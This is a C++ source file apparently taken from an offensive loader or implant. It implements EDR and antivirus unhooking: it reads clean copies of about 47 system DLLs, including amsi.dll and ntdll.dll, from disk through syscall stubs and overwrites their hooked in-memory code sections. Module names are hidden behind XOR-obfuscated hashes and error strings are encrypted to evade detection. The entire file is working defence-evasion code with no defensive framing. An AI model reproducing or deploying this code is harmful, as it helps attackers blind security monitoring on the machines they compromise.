#include "Unhooker.hpp"
#include "Instance.hpp"
#include "Win32.hpp"
#include "StringCrypt.hpp"
#include "SecureString.hpp"
#include "SecureException.hpp"

void Unhooker::Unhook(PLDR_DATA_TABLE_ENTRY hModule) {
    PVOID pDllBase = NULL;
    ULONG oldProtect = 0;
    SIZE_T bytesWritten = 0;
    WCHAR wPath[255];
    UNICODE_STRING uPath;
    HANDLE hFile = NULL;
    OBJECT_ATTRIBUTES oa = { 0 };
    IO_STATUS_BLOCK iosb = { 0 };
    FILE_STANDARD_INFORMATION fsi = { 0 };
    BYTE* pDosBuf = nullptr;

    try {
        swprintf(wPath, sizeof(wPath)/sizeof(wPath[0]), L"\\??\\%ls", hModule->FullDllName.Buffer);
        //printf("wPath: %ls\n", &wPath);
        pRtlInitUnicodeString _pRtlInitUnicodeString = (pRtlInitUnicodeString)Win32::NtdllTable.pRtlInitUnicodeString.pAddress;
        _pRtlInitUnicodeString(&uPath, (PWSTR)&wPath);
        InitializeObjectAttributes(&oa, &uPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

        // Open the desired file
        SyscallPrepare(SystemCalls::SysTable.SysNtOpenFile.wSyscallNr, SystemCalls::SysTable.SysNtOpenFile.pRecycled);
        Instance::NtStatus = SysNtOpenFile(&hFile, SYNCHRONIZE | FILE_READ_ATTRIBUTES | FILE_READ_DATA,
            &oa, &iosb, FILE_SHARE_READ | FILE_SHARE_DELETE, FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE);
        if (!NT_SUCCESS(Instance::NtStatus)) {
            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::OPENINGIMAGE_CRYPT), Instance::NtStatus));
        }

        // Get its size
        SyscallPrepare(SystemCalls::SysTable.SysNtQueryInformationFile.wSyscallNr, SystemCalls::SysTable.SysNtQueryInformationFile.pRecycled);
        Instance::NtStatus = SysNtQueryInformationFile(hFile, &iosb, &fsi, sizeof(fsi), FileStandardInformation);
        if (!NT_SUCCESS(Instance::NtStatus)) {
            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::QUERYINGFILEINFO_CRYPT), Instance::NtStatus));
        }

        // Read it
        pDosBuf = new BYTE[fsi.EndOfFile.QuadPart];
        SyscallPrepare(SystemCalls::SysTable.SysNtReadFile.wSyscallNr, SystemCalls::SysTable.SysNtReadFile.pRecycled);
        Instance::NtStatus = SysNtReadFile(hFile, NULL, NULL, NULL, &iosb, pDosBuf, fsi.EndOfFile.QuadPart, NULL, NULL);
        if (!NT_SUCCESS(Instance::NtStatus)) {
            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::READINGIMAGE_CRYPT), Instance::NtStatus));
        }

        pDllBase = (PVOID)hModule->DllBase;
        PIMAGE_SECTION_HEADER oTextSection = NULL;
        PIMAGE_SECTION_HEADER hTextSection = NULL;
        PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)pDllBase;
        PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)pDllBase + hookedDosHeader->e_lfanew);
        PIMAGE_DOS_HEADER oDosHeader = (PIMAGE_DOS_HEADER)pDosBuf;
        PIMAGE_NT_HEADERS oNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)pDosBuf + oDosHeader->e_lfanew);

        if (oNtHeader->Signature != IMAGE_NT_SIGNATURE || hookedNtHeader->Signature != IMAGE_NT_SIGNATURE) {
            throw SecureException(Instance::FormatErrorMessage(StringCrypt::DecryptString(StringCrypt::RETRIEVINGHEADERS_CRYPT)));
        }

        for (WORD i = 0; i < oNtHeader->FileHeader.NumberOfSections; i++)
        {
            PIMAGE_SECTION_HEADER oSecHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(oNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
            if (!_stricmp((char*)oSecHeader->Name, (char*)StringCrypt::DecryptString(StringCrypt::TEXT_CRYPT).c_str()))
            {
                oTextSection = oSecHeader;
            }
        }
        for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++)
        {
            PIMAGE_SECTION_HEADER hSecHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
            if (!_stricmp((char*)hSecHeader->Name, (char*)StringCrypt::DecryptString(StringCrypt::TEXT_CRYPT).c_str()))
            {
                hTextSection = hSecHeader;
            }
        }

        LPVOID hookedVA = (LPVOID)((DWORD_PTR)pDllBase + (DWORD_PTR)hTextSection->VirtualAddress);
        SIZE_T oHookedSize = hTextSection->Misc.VirtualSize;
        LPVOID origVA = (LPVOID)((DWORD_PTR)pDosBuf + (DWORD_PTR)oTextSection->PointerToRawData);
        SIZE_T oOrigSize = oTextSection->Misc.VirtualSize;
        SIZE_T pOrigSize = oTextSection->Misc.VirtualSize;

        SyscallPrepare(SystemCalls::SysTable.SysNtProtectVirtualMemory.wSyscallNr, SystemCalls::SysTable.SysNtProtectVirtualMemory.pRecycled);
        Instance::NtStatus = SysNtProtectVirtualMemory(Instance::Process, &hookedVA, &pOrigSize, PAGE_EXECUTE_READWRITE, &oldProtect);
        if (!NT_SUCCESS(Instance::NtStatus)) {
            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::PROTECTINGMEMORY_CRYPT), Instance::NtStatus));
        }

        SyscallPrepare(SystemCalls::SysTable.SysNtWriteVirtualMemory.wSyscallNr, SystemCalls::SysTable.SysNtWriteVirtualMemory.pRecycled);
        Instance::NtStatus = SysNtWriteVirtualMemory(Instance::Process, hookedVA, origVA, oOrigSize, &bytesWritten);
        if (!NT_SUCCESS(Instance::NtStatus)) {
            throw SecureException(Instance::FormatNtStatus(StringCrypt::DecryptString(StringCrypt::WRITINGMEMORY_CRYPT), Instance::NtStatus));
        }

        delete[] pDosBuf;
        pDosBuf = nullptr;
        SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
        SysNtClose(hFile);
    }
    catch (...) {
        if (pDosBuf) {
			delete[] pDosBuf;
			pDosBuf = nullptr;
		}
        if (hFile) {
            SyscallPrepare(SystemCalls::SysTable.SysNtClose.wSyscallNr, SystemCalls::SysTable.SysNtClose.pRecycled);
            SysNtClose(hFile);
        }
        throw;
    }
}

void Unhooker::DoUnhook() {
    PUNICODE_STRING pDllName = NULL, pFullDllName = NULL;
    PPEB_LDR_DATA pLdrData = NULL;
    PLDR_DATA_TABLE_ENTRY pModuleEntry = NULL, pModuleStart = NULL;
    PPEB pCurrentPeb = SystemCalls::Peb;
    pLdrData = pCurrentPeb->Ldr;
    pModuleEntry = pModuleStart = (PLDR_DATA_TABLE_ENTRY)pLdrData->InLoadOrderModuleList.Flink;
    int count = 0;

    do {
        pDllName = &pModuleEntry->BaseDllName;
        pFullDllName = &pModuleEntry->FullDllName;
        if (pDllName->Buffer == NULL) {
            //printf("[*] got null...\n");
            break;
        }
#ifdef DEBUG
        printf("Full: %ls\n", pFullDllName->Buffer);
#endif

        if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(ADVAPI32DLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(AMSIDLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(BCRYPTDLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(BCRYPTPRIMITIVESDLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(COMBASEDLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(CRYPT32DLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(CRYPTBASEDLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(CRYPTSPDLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(DNSAPIDLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(DPAPIDLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(GDI32DLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(GDI32FULLDLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(GPAPIDLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(IMM32DLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(IPHLPAPIDLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(KERNEL32DLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(KERNELBASEDLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(MSASN1DLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(MSCOREEDLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(MSVCP140DLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(MSVCP_WINDLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(MSVCRTDLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(MSWSOCKDLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(NCRYPTDLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(NCRYPTSSLPDLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(NSIDLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(NTASN1DLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(NTDLLDLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(OLEAUT32DLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(RASADHLPDLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(RPCRT4DLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(RSAENHDLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(SCHANNELDLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(SECHOSTDLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(SHELL32DLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(SSPICLIDLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(UCRTBASEDLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(USER32DLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(VCRUNTIME140DLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(VCRUNTIME140_1DLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(WEBIODLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(WIN32UDLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(WINHTTPDLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(WINNLSRESDLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(WINNSIDLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }
        else if (SystemCalls::djb2_unicode(SystemCalls::toLower(pDllName->Buffer)) == SystemCalls::xor_hash(WS2_32DLL_HASH)) {
            Unhook(pModuleEntry);
            count++;
        }

        pModuleEntry = (PLDR_DATA_TABLE_ENTRY)pModuleEntry->InLoadOrderLinks.Flink;
    } while (pModuleEntry != pModuleStart);
    //printf("[+] Unhooked %d modules\n", count);
    return;
}